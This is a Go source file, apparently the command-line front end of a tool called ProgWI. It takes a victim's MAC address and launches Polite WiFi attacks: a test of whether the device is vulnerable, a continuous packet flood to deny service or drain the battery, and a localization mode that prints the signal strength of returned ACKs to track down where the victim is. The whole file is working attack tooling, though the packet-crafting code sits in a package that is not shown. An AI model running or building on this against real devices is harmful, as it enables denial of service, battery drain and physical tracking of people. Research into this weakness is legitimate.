package cli

import (
	"strconv"
	"flag"
	"fmt"
	"net"

	"ProgWI/attack"

	"github.com/google/gopacket"
)

/**
* Parse the command-line arguments and launch the chosen attack on the specified victim
*/
func ParseCLIArguments() {
	victim_mac_flag := flag.String("m", "", "MAC of the victim")
	wait_time := flag.Int("w", 800, "Wait time of packets [ms] (optional, default 1 packet every 800ms)")
	test_attack := flag.Bool("t", false, "Test if the victim is vulnerable to the Polite Wifi attack")
	dosbat_attack := flag.Bool("d", false, "Send many packets to the victim in order to DoS them or to drain their battery")
	local_attack := flag.Bool("l", false, "Send many packets to the victim and show their RSSI to localize them")
	flag.Parse()

	victim_mac, err := net.ParseMAC(*victim_mac_flag)
	if (err != nil) {
		fmt.Println("The MAC specified for the attack is not valid")
		return
	}

	// the minimum waiting time is 1ms
	if (*wait_time < 1) {
		*wait_time = 1
	}

	// if no attack was specified, return
	if !(*test_attack || *dosbat_attack || *local_attack) {
		fmt.Println("No attack was specified")
		return
	}

	// launch the attacks
	if (*test_attack) {
		fmt.Println("Launching Test Attack, other attacks specified will be ignored")
		LaunchTestAttack(victim_mac)
	} else if (*dosbat_attack) {
		fmt.Println("Launching DoS/Battery Attack, other attacks specified will be ignored")
		LaunchDoSBatAttack(victim_mac, *wait_time)
	} else if (*local_attack) {
		fmt.Println("Launching Localization Attack, other attacks specified will be ignored")
		LaunchLocalizationAttack(victim_mac, *wait_time)
	}
}

/**
* Launch the Test attack: send a single packet and see if an ACK is received
*/
func LaunchTestAttack(victim_mac []byte) {
	// used to tell if and when to attack
	command_channel := make(chan bool)
	// used to get packets back from the sniffer
	ack_channel := make(chan gopacket.Packet)

	// launch the attack and the sniffer on separate threads
	go attack.StartAttack(victim_mac, command_channel)
	go attack.CaptureACKs(ack_channel, command_channel)

	fmt.Println("Test the victim by sending one packet - Press Ctrl-C to stop")

	// send a command to start the attack
	command_channel <- true
	fmt.Println("Sent one packet, waiting for the ACK...\nIf no ACK is received, the victim may be not vulnerable or the ACK was lost (try again)")

	// get the packet back
	<-ack_channel
	fmt.Println("ACK received, the victim is vulnerable\nRun the program again and try other attacks")

	// send a command to stop the attack
	command_channel <- false
}

/**
* Launch the DoS or Battery attack: send many packets, at a rate decided by
* the chosen waiting time (default 800ms)
*/
func LaunchDoSBatAttack(victim_mac []byte, wait_time int) {
	// used to tell if and when to attack
	command_channel := make(chan bool)
	// used to get packets back from the sniffer
	ack_channel := make(chan gopacket.Packet)
	// used to tell when the attack is stopped by the user
	done_channel := make(chan bool)

	// launch the attack and the sniffer on separate threads
	go attack.StartAttack(victim_mac, command_channel)
	go attack.CaptureACKs(ack_channel, command_channel)

	fmt.Println("Transmitting 1 packet each " + strconv.Itoa(wait_time)  + "ms - Press Ctrl-C to stop")

	// execute the attack
	attack.ContinuousAttack(command_channel, done_channel, wait_time)
}

/**
* Launch the Localization attack: send many packets, at a rate decided by
* the chosen waiting time (default 800ms), and print on the screen the RSSI
* of the received ACKs
*/
func LaunchLocalizationAttack(victim_mac []byte, wait_time int) {
	// used to tell if and when to attack
	command_channel := make(chan bool)
	// used to get packets back from the sniffer
	ack_channel := make(chan gopacket.Packet)
	// used to tell when the attack is stopped by the user
	done_channel := make(chan bool)

	// launch the attack and the sniffer on separate threads
	go attack.StartAttack(victim_mac, command_channel)
	go attack.CaptureACKs(ack_channel, command_channel)

	fmt.Println("Transmitting 1 packet each " + strconv.Itoa(wait_time)  + "ms - Press Ctrl-C to stop\n")
	fmt.Println("These are the Received Signal Strength Indicator [dBm] of the received packets\n")
	fmt.Println("They can be used to localize the victim, since they become higher (they're negative numbers) the closer the attacker is to the victim\n")

	// get ACKs from the ack channel and display them on the screen
	go displayRSSI(ack_channel, done_channel)

	// execute the attack
	attack.ContinuousAttack(command_channel, done_channel, wait_time)
}

/**
* Get the captured ACKs from the channel and print the RSSIs
*/
func displayRSSI(ack_channel chan gopacket.Packet, done_channel chan bool) {
	for {
		select {
		// stop if the attack is done
		case <- done_channel:
			return
		default:
			ack := <-ack_channel
			fmt.Println(attack.GetRSSI(ack) + " dBm")
		}
	}
}
